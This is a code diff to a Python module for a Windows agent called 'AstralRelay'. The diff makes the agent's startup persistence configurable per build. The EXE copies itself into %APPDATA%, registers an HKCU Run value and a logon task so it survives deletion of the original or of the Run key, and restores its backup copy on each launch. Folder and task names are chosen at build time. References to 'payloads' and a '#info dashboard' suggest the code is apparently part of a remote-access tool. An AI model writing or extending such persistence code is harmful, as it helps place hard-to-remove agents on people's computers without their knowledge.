@@ -1,50 +1,59 @@
 # Windows startup registration for the production agent.
-# On launch the frozen EXE ensures itself under HKCU Run so the agent
-# starts with Windows. HKCU needs no administrator rights. Only runs
-# for frozen builds; development runs never touch the registry.
-# Failures are best-effort and never stop the agent.
+# On launch the frozen EXE can copy itself under %APPDATA% and register
+# itself under HKCU Run plus a logon task so the agent starts with
+# Windows. The embedded config gates both behaviors per build. HKCU
+# needs no administrator rights. Only frozen builds ever install or
+# touch the registry; development runs are always skipped. Failures are
+# best-effort and never stop the agent.
 
 from __future__ import annotations
 
+import os
+import shutil
+import subprocess
 import sys
+from pathlib import Path
+
+from astral_relay.shared.config import DEFAULT_STARTUP_NAME
 
 RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
-VALUE_NAME = "AstralRelay"
-TASK_NAME = "AstralRelay"
-BACKUP_DIRNAME = "AstralRelay"
 BACKUP_FILENAME = "AstralRelay-Agent.exe"
 
 
-def backup_paths(env=None):
-    """Resolve the backup directory and EXE path under %APPDATA%."""
-    import os
+def _startup_name(value=None) -> str:
+    """Normalize a build-time startup name, falling back to the default."""
+    text = str(value).strip() if value is not None else ""
+    return text or DEFAULT_STARTUP_NAME
 
+
+def backup_paths(env=None, startup_name=None):
+    """Resolve the backup directory and EXE path under %APPDATA%.
+
+    The subfolder is named after the build's startup name; the backup
+    file name itself stays fixed.
+    """
     source = env if env is not None else os.environ
     base = source.get("APPDATA") or source.get("LOCALAPPDATA")
     if not base:
         return None, None
-    from pathlib import Path
-
-    directory = Path(base) / BACKUP_DIRNAME
+    directory = Path(base) / _startup_name(startup_name)
     return directory, directory / BACKUP_FILENAME
 
 
-def ensure_backup_copy(exe_path: str | None = None) -> tuple[str, str | None]:
+def ensure_backup_copy(exe_path: str | None = None, startup_name=None) -> tuple[str, str | None]:
     """Install or repair the backup copy under %APPDATA%.
 
     Copies the running frozen EXE aside so deleting the original no
-    longer kills autostart. Verifies by size on every launch and
-    repairs from the running image when missing or damaged. Returns
-    (status, backup_path): installed/current/repaired/skipped/failed.
-    Never raises.
+    longer kills autostart. The subfolder uses `startup_name`; the file
+    name stays fixed. Verifies by size on every launch and repairs from
+    the running image when missing or damaged. Returns (status,
+    backup_path): installed/current/repaired/skipped/failed. Never
+    raises.
     """
-    import os
-    import shutil
-
     if not getattr(sys, "frozen", False):
         return "skipped", None
     src = exe_path or sys.executable
-    directory, dst = backup_paths()
+    directory, dst = backup_paths(startup_name=startup_name)
     if not src or directory is None or dst is None:
         return "failed", None
     try:
@@ -82,8 +91,6 @@ def terminate_holders(exe_path: str) -> int:
     be replaced during build publish or backup repair.
     """
     import ctypes
-    import os
-    import subprocess
 
     try:
         target_base = os.path.basename(exe_path).lower()
@@ -151,22 +158,22 @@ def terminate_holders(exe_path: str) -> int:
         return 0
 
 
-def ensure_logon_task(exe_path: str) -> str:
+def ensure_logon_task(exe_path: str, task_name=None) -> str:
     """Register a logon trigger as a second launch layer. Best-effort.
 
-    Survives Run-key deletion. Returns added/current/failed. Never raises.
+    The task is named after the build's startup name. Survives Run-key
+    deletion. Returns added/current/failed. Never raises.
     """
-    import subprocess
-
+    name = _startup_name(task_name)
     try:
         check = subprocess.run(
-            ["schtasks", "/query", "/tn", TASK_NAME],
+            ["schtasks", "/query", "/tn", name],
             capture_output=True, shell=False, timeout=30,
         )
         if check.returncode == 0:
             return "current"
         created = subprocess.run(
-            ["schtasks", "/create", "/tn", TASK_NAME, "/tr", f'"{exe_path}"',
+            ["schtasks", "/create", "/tn", name, "/tr", f'"{exe_path}"',
              "/sc", "onlogon", "/rl", "limited", "/f"],
             capture_output=True, shell=False, timeout=30,
         )
@@ -180,19 +187,21 @@ def _open_run_key(winreg, write: bool):
     return winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, access)
 
 
-def ensure_autorun(exe_path: str | None = None) -> str:
+def ensure_autorun(exe_path: str | None = None, value_name=None) -> str:
     """Register this EXE for Windows startup. Returns a status word.
 
-    Returns 'added' when newly registered, 'current' when already set
-    to this path, 'updated' when an old path was replaced, 'skipped'
-    when not a frozen build, and 'failed' when the registry is
-    unavailable. Never raises.
+    The Run value is named after the build's startup name. Returns
+    'added' when newly registered, 'current' when already set to this
+    path, 'updated' when an old path was replaced, 'skipped' when not a
+    frozen build, and 'failed' when the registry is unavailable. Never
+    raises.
     """
     if not getattr(sys, "frozen", False):
         return "skipped"
     target = exe_path or sys.executable
     if not target:
         return "failed"
+    name = _startup_name(value_name)
     try:
         import winreg
     except ImportError:
@@ -201,7 +210,7 @@ def ensure_autorun(exe_path: str | None = None) -> str:
     try:
         with _open_run_key(winreg, False) as key:
             try:
-                current, _ = winreg.QueryValueEx(key, VALUE_NAME)
+                current, _ = winreg.QueryValueEx(key, name)
             except OSError:
                 current = None
     except OSError:
@@ -210,7 +219,80 @@ def ensure_autorun(exe_path: str | None = None) -> str:
         return "current"
     try:
         with _open_run_key(winreg, True) as key:
-            winreg.SetValueEx(key, VALUE_NAME, 0, winreg.REG_SZ, command)
+            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
     except OSError:
         return "failed"
     return "updated" if current else "added"
+
+
+def apply_self_install(config: dict | None = None) -> dict:
+    """Apply the build-time self-install choices embedded in the config.
+
+    `installToAppData` gates copying the EXE under %APPDATA%;
+    `enableAutostart` gates the HKCU Run key and the logon task;
+    `startupName` names the %APPDATA% subfolder, the Run value, and the
+    logon task. When autostart is enabled without a backup copy it
+    targets the running EXE. Missing keys default to enabled so older
+    payloads keep their original behavior. Only frozen builds touch the
+    registry or a task; development runs stay skipped. Returns status
+    words. Never raises.
+    """
+    options = config or {}
+    name = options.get("startupName")
+    backup_status, backup_path = ("skipped", None)
+    if bool(options.get("installToAppData", True)):
+        backup_status, backup_path = ensure_backup_copy(startup_name=name)
+    autorun_status = "skipped"
+    task_status = "skipped"
+    if bool(options.get("enableAutostart", True)) and getattr(sys, "frozen", False):
+        target = backup_path or sys.executable
+        autorun_status = ensure_autorun(target, value_name=name)
+        task_status = ensure_logon_task(target, task_name=name)
+    return {"backup": backup_status, "backupPath": backup_path,
+            "autorun": autorun_status, "logonTask": task_status}
+
+
+def read_registration(startup_name=None, env=None) -> dict:
+    """Report the current startup registration without changing anything.
+
+    Reads the HKCU Run value, queries the logon task, and stats the
+    backup copy so the #info dashboard can show installation state.
+    Nothing is created, written, or deleted here. Never raises.
+    """
+    name = _startup_name(startup_name)
+    result = {
+        "valueName": name,
+        "runKey": "unavailable",
+        "runCommand": None,
+        "logonTask": "unknown",
+        "backupPath": None,
+        "backupPresent": False,
+    }
+    try:
+        import winreg
+
+        with _open_run_key(winreg, False) as key:
+            try:
+                current, _ = winreg.QueryValueEx(key, name)
+                result["runKey"] = "registered"
+                result["runCommand"] = str(current)
+            except OSError:
+                result["runKey"] = "missing"
+    except (ImportError, OSError):
+        result["runKey"] = "unavailable"
+    _, backup = backup_paths(env, startup_name)
+    if backup is not None:
+        result["backupPath"] = str(backup)
+        try:
+            result["backupPresent"] = backup.is_file()
+        except OSError:
+            result["backupPresent"] = False
+    try:
+        check = subprocess.run(
+            ["schtasks", "/query", "/tn", name],
+            capture_output=True, shell=False, timeout=30,
+        )
+        result["logonTask"] = "present" if check.returncode == 0 else "absent"
+    except (OSError, subprocess.SubprocessError):
+        result["logonTask"] = "unknown"
+    return result
